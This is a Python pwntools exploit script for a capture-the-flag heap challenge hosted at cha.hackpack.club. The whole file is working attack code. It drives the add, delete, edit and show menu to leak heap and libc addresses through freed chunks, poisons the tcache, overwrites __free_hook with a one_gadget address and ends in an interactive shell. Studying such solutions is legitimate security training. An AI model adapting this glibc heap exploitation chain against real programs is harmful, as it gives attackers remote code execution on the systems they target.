from pwn import *

# p = process('./chal')
p = remote('cha.hackpack.club', 41705)
elf = ELF('./chal')
lib = ELF('./libc6_2.27-3ubuntu1.6_amd64.so')


def choice(id_):
    p.recvuntil(b':')
    p.sendline(id_)


def add(id_, name_, num):
    choice(b'1')
    p.recvuntil(b':')
    p.sendline(id_)
    p.recvuntil(b':')
    p.sendline(name_)
    p.recvuntil(b':')
    p.sendline(num)


def delete(id_):
    choice(b'2')
    p.recvuntil(b':')
    p.sendline(id_)


def edit(id_, num):
    choice(b'3')
    p.recvuntil(b':')
    p.sendline(id_)
    p.recvuntil(b':')
    p.sendline(num)


def show(id_):
    choice(b'4')
    p.recvuntil(b':')
    p.sendline(id_)


[add(str(i), b'a', b'12') for i in range(10)]
[delete(str(i)) for i in range(9)]
delete(b'7')
show(b'1')
p.recv()
heap_addr = u64(p.recv(6).ljust(8, b'\00'))
print(hex(heap_addr))
chunk_list = heap_addr - 0x3b0 + 0x2c0
heap_base = heap_addr - 0x370 + 0x8
unsorted_chunk = heap_addr - 0xb0
print(hex(heap_base))
print(hex(unsorted_chunk))
[add(b'1', b'a', b'12') for i in range(7)]
add(b'1', p64(chunk_list), b'12')
add(b'0', b'chunk0', b'1234')
add(b'1', b'chunk1', b'1234')
add(b'2', p64(heap_base), b'1234')
edit(b'4', b'-1')
edit(b'2', str(unsorted_chunk))
delete(b'6')
show(b'6')
p.recv()
main_area = u64(p.recv(6).ljust(8, b'\00'))
print(main_area)
malloc_hook = main_area - 96 - 0x10
base_addr = malloc_hook - lib.sym['__malloc_hook']
free_hook = base_addr + lib.sym['__free_hook']
print(hex(malloc_hook))
print(hex(base_addr))
edit(b'2', str(free_hook - 0x10))
key = [0x4f2a5, 0x4f302, 0x10a2fc]
one_gadget = base_addr + key[2]
edit(b'6', str(one_gadget))
delete(b'0')
p.interactive()
